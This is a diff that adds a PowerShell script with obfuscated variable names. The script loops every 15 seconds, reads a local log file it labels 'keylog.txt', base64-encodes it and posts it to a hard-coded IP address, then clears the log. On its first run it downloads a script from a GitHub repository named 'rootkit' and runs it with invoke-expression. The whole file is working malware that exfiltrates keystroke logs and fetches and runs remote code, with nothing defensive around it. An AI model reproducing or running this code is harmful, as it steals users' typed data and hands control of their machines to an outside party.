@@ -1,0 +1,31 @@
+$elapsedTime = 0
+while($true)
+{
+    $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
+    $srsdf='http://172.20.101.20/receive.php' 
+
+    function GetFile() {
+        param (
+            $mytar,
+            $name
+        )
+        Write-Output $name
+        $dhd=[IO.File]::readallbytes($mytar);
+        $kfjh=[System.Convert]::ToBase64String($dhd);
+        $kfjh=[regex]::Replace($kfjh,'=','%');
+        $msgin='access='+$kfjh+'&name='+$name;
+        Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
+        Clear-Content -Path $logFilePath
+
+    }
+    GetFile $logFilePath "keylog.txt"
+    if($elapsedTime -eq 0) {
+        [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/main')};
+        $qweewqq=$nbvccxx.Replace('wererfvx','kkk');
+        $zxdsxxxxc=iex $qweewqq;
+        invoke-expression $zxdsxxxxc
+    }
+    Write-Output "K"
+    $elapsedTime = (15 + $elapsedTime) % 60
+    start-sleep -s 15
+}
